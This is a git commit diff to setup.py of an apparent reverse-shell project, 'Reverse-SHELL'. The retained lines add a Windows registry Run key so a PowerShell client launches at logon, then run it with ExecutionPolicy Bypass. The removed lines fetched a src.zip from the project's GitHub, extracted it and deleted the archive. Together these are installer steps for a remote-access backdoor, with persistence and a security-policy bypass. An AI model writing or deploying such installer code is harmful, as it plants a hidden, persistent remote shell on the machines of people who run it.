8aea9019e5b53b2deccd8ff550af9797dd2ece66
Muzaffar Sharofitdinov <smartboymuzaffar@gmail.com>
2024-04-28 04:31:41 +0900

    Update setup.py

--- setup.py
+++ setup.py
@@ -21,15 +21,6 @@ def setup():
     subprocess.call(
             'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v client /d "' + ps1_path + '"',
             shell=True)
-    # download src.zip file
-    subprocess.call(f'powershell invoke-webrequest -uri "https://github.com/SmartBoyMuzaffar/Reverse-SHELL/raw/master/src.zip" -outfile "{path}\\src.zip"',
-                    shell=True)
-    # extract src.zip file
-    subprocess.call(f'powershell.exe tar -xf {path}\\src.zip -C {path}',
-                    shell=True)
-    # delete src.zip file
-    subprocess.call(f'powershell.exe rm {path}\\src.zip',
-                    shell=True)
     # run client.py file
     subprocess.call(f'powershell.exe -ExecutionPolicy Bypass {ps1_path}',
                     shell=True)
